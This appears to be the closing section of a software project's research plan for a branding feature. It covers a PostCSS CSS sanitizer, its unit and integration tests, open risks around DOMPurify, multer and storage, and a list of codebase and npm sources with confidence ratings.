**Scope:** PostCSS sanitizer + wired into PUT + CSS-focused tests + OIDC smoke tests.

Wave 1:
- `src/lib/brandCssSanitizer.ts`: implement `sanitizeCssPostcss()` (exact code sketched above)
- `index.ts` PUT `/api/branding`: wire `sanitizeCssPostcss(configObj.customCss)` before DB write

Wave 2 (depends on sanitizer existing):
- `tests/lib.brandCssSanitizer.spec.ts`: unit tests (url(), @import, expression(), unicode-escape, preserves legitimate CSS)
- `tests/routes.branding.spec.ts`: add CSS sanitization integration tests (PUT with attack vectors, verify stored value sanitized)
- `tests/routes.branding.spec.ts`: add OIDC smoke block (`AUTH_MODE=oidc`, unauthenticated GET works, admin JWT session works)

**Gate:** All tests green (routes.branding + lib.brandCssSanitizer); SET-BASED server vitest gate ⊆ TD-V16-TEST-ISOLATION; `tsc` clean

---

## Open Questions and Risks

1. **`lib.permissions.spec.ts` count assertion** — check if `tests/lib.permissions.spec.ts` asserts `ALL_PERMISSIONS.length === 17`. If so, it must be updated to 18 in Plan 81-01. This spec exists at `packages/server/tests/lib.permissions.spec.ts`.

2. **DOMPurify jsdom instantiation cost** — jsdom `new JSDOM(...)` is ~10-50 ms startup. For logo upload (rare operation), this is acceptable. Use a module-level singleton pattern to pay the cost once:
   ```typescript
   // At module scope in index.ts or a dedicated sanitizer module
   import { JSDOM } from "jsdom";
   import DOMPurify from "dompurify";
   const _domWindow = new JSDOM("").window;
   const _purify = DOMPurify(_domWindow);
   // Then reuse _purify.sanitize() per request
   ```

3. **multer error handling** — multer throws a `MulterError` when `fileSize` limit is exceeded; this is NOT a standard Express error and does NOT go through `asyncHandler → errorMiddleware`. Must be caught explicitly or with a custom error handler. Pattern: wrap the multer middleware + check `err instanceof multer.MulterError` and return 413.

4. **`logo_data` column type** — `TEXT` (base64 string) vs `BLOB`. The architecture research chose TEXT/base64. `better-sqlite3` returns BLOBs as Node `Buffer` and TEXTs as strings; TEXT/base64 avoids binary encoding ambiguity in SQLite. Either works; the plan must be consistent.

5. **Custom CSS scoping is DEFERRED** — Phase 81 stores PostCSS-sanitized CSS. Phase 83 handles `@scope (#root)` wrapping at injection time. Phase 81 must preserve the sanitized string faithfully (no additional transformation) so Phase 83 can wrap it.

6. **TD-V16-TEST-ISOLATION** — the existing known-flaky test set must be checked before committing Plan 81-03 to ensure `routes.branding.spec.ts` is not accidentally added to it (it should not be — new spec with deterministic behavior).

---

## Sources

### Primary (HIGH confidence — direct codebase inspection)
- `packages/server/src/db.ts` — SCHEMA_DDL (lines 14-244), `createDb()` (lines 246-327), `column_display_config` precedent (lines 229-243), seedRbac call (line 324)
- `packages/server/src/lib/permissions.ts` — 17-permission catalog, `DEFAULT_ROLE_MAPPINGS`, `ALL_PERMISSIONS`
- `packages/server/src/lib/rbacSeed.ts` — history-gated seed mechanism (lines 39-82)
- `packages/server/src/rbac.ts` — `requirePermission` factory, two-element spread pattern (lines 44-72)
- `packages/server/src/index.ts` — `asyncHandler` (lines 293-303), pre-requireAuth routes (lines 377-381), `app.use("/api", requireAuth)` (line 530), route patterns (lines 542+), cache headers (lines 379, 2199, 2215), `column-display-config` endpoints (lines 2103-2134)
- `packages/server/tests/helpers/app.ts` — `buildTestApp()` pattern
- `packages/server/tests/helpers/db.ts` — `createAdminSession()` pattern
- `packages/server/tests/setup.ts` — `DB_PATH=:memory:`, env stubs
- `packages/server/tests/routes.dynamic-view-drop.spec.ts` — both-auth-modes pattern with `vi.stubEnv`
- `packages/server/tests/routes.column-display-config.spec.ts` — column-config CRUD test shape
- `packages/server/package.json` — `"type": "module"`, Node 24.14.1 runtime, existing deps
- `packages/server/tsconfig.json` — `module: ESNext`, `esModuleInterop: true`
- `packages/web/src/lib/permissions.ts` — web mirror pattern, 17 entries + `DASHBOARDS_MANAGE_ACCESS` as last

### Primary (HIGH confidence — npm registry, verified 2026-06-24)
- `multer@2.2.0` — CJS, `engines: node>=10.16.0`, no `type` field
- `file-type@19.x` — ESM (`type: module`), `engines: node>=18`; v22 requires `node>=22`
- `postcss@8.5.15` — dual CJS+ESM, no strict Node version requirement
- `dompurify@3.4.11` — CJS main (`dist/purify.cjs.js`), `esModuleInterop` compatible
- `jsdom@29.1.1` — CJS (`type: commonjs`), `engines: node>=18`

### Secondary (MEDIUM confidence — research synthesis)
- `.planning/research/PITFALLS.md` — CSS injection CVE patterns, regex bypass confirmation, PostCSS recommendation
- `.planning/research/SUMMARY.md` — Open Decision 2 resolution, architecture overview
- `.planning/research/ARCHITECTURE.md` — brand_config schema shape, API route shapes, wire format
- `.planning/STATE.md` (v1.16 Key Architectural Decisions) — locked decisions, permission pattern

---

## Metadata

**Confidence breakdown:**
- Table DDL + seed: HIGH — exact house style confirmed from db.ts lines 229-243 + 324
- Permission threading (3 files): HIGH — exact 3-file pattern confirmed from permissions.ts + rbacSeed.ts + web/permissions.ts
- Route patterns (requirePermission, asyncHandler, Cache-Control): HIGH — direct index.ts citation
- Test patterns (buildTestApp, both-auth-modes, SET-BASED gate): HIGH — direct spec file inspection
- CSS sanitization (PostCSS AST): HIGH — PITFALLS.md CVE confirmation + postcss@8 current version confirmed
- ESM/CJS compatibility: HIGH — npm registry metadata verified 2026-06-24
- file-type version selection: HIGH — versions 17-22 checked, v19 confirmed ESM + node>=18

**Research date:** 2026-06-24
**Valid until:** 2026-07-24 (stable deps, 30-day window)
